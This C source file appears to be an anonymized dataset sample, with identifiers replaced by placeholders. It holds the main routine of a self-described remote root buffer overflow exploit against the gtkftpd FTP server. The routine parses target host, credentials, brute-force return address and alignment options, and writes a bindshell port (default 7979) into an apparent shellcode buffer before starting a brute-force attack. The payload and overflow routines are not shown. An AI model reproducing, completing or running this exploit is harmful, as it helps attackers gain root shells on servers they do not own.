
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 char* VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_0 (scalar_t__) ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int FUNC_1 (int ) ;
 int FUNC_2 () ;
 scalar_t__ FUNC_3 (char*) ;
 int FUNC_4 (int,char**,char*) ;
 char* VAR_12 ;
 int VAR_13 ;
 scalar_t__ VAR_14 ;
 char* VAR_15 ;
 int VAR_16 ;
 int FUNC_5 (char*,int) ;
 int FUNC_6 (char*,...) ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int FUNC_7 (int ,int ) ;
 int VAR_20 ;
 int FUNC_8 (scalar_t__,char*,int*) ;
 scalar_t__ FUNC_9 (scalar_t__) ;
 int FUNC_10 (char*) ;
 char* VAR_21 ;
 char* VAR_22 ;
 int* VAR_23 ;

int FUNC_11(int VAR_24,char **VAR_25){
 int VAR_26=0;
 FUNC_6("[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");

 if(FUNC_3("COLUMNS"))VAR_11=FUNC_0(FUNC_3("COLUMNS"));
 if(7>VAR_11||VAR_11>256)VAR_11=VAR_1;
 while((VAR_26=FUNC_4(VAR_24,VAR_25,"h:P:s:u:p:c:b:a:n:rd"))!=VAR_5){
  switch(VAR_26){
   case 'h':
    if(!VAR_12&&!(VAR_12=(char *)FUNC_9(VAR_14)))
     FUNC_5("main(): allocating memory failed.",1);
    break;
   case 'P':
    VAR_16=FUNC_0(VAR_14);
    break;
   case 's':
    VAR_20=FUNC_0(VAR_14);
    break;
   case 'u':
    if(!VAR_21&&!(VAR_21=(char *)FUNC_9(VAR_14)))
     FUNC_5("main(): allocating memory failed.",1);
    break;
   case 'p':
    if(!VAR_15&&!(VAR_15=(char *)FUNC_9(VAR_14)))
     FUNC_5("main(): allocating memory failed.",1);
    break;
   case 'c':
    if(!VAR_22&&!(VAR_22=(char *)FUNC_9(VAR_14)))
     FUNC_5("main(): allocating memory failed.",1);
    break;
   case 'b':
    FUNC_8(VAR_14,"%x",&VAR_10);
    break;
   case 'a':
    VAR_8=FUNC_0(VAR_14);
    break;
   case 'n':
    VAR_9=FUNC_0(VAR_14);
    break;
   case 'r':
    VAR_17=1;
    break;
   case 'd':
    VAR_13=1;
    break;
   default:
    FUNC_10(VAR_25[0]);
    break;
  }
 }
 if(!VAR_12)
  FUNC_10(VAR_25[0]);

 if(!VAR_21)VAR_21=VAR_4;
 if(!VAR_15)VAR_15=VAR_3;
 if(!VAR_22)VAR_22=VAR_2;
 if(!VAR_10)VAR_10=VAR_0;
 if(VAR_8>3)VAR_8=2;
 if(!((VAR_20&0xff00)>>8)||!(VAR_20&0x00ff)){
  FUNC_6("[!] shell port defined contains null byte(s), using default.\n");
  VAR_20=7979;
 }

 VAR_23[20]=(VAR_20&0xff00)>>8;
 VAR_23[21]=(VAR_20&0x00ff);

 FUNC_6("[*] target: %s:%d, identity: %s:%s.\n[*] directory: %s, brute"
 " start: 0x%.8x, alignment: %d.\n[*] memory direction: %s, attempts: "
 "%d, bindshell port: %d.\n\n",VAR_12,VAR_16,VAR_21,VAR_15,VAR_22,VAR_10,
 VAR_8,(!VAR_17?"downward":"upward"),VAR_9,VAR_20);
 FUNC_7(VAR_6,VAR_18);
 FUNC_7(VAR_7,VAR_19);
 FUNC_2();
 FUNC_5("brute force exhausted, failed.",0);
 FUNC_1(0);
}
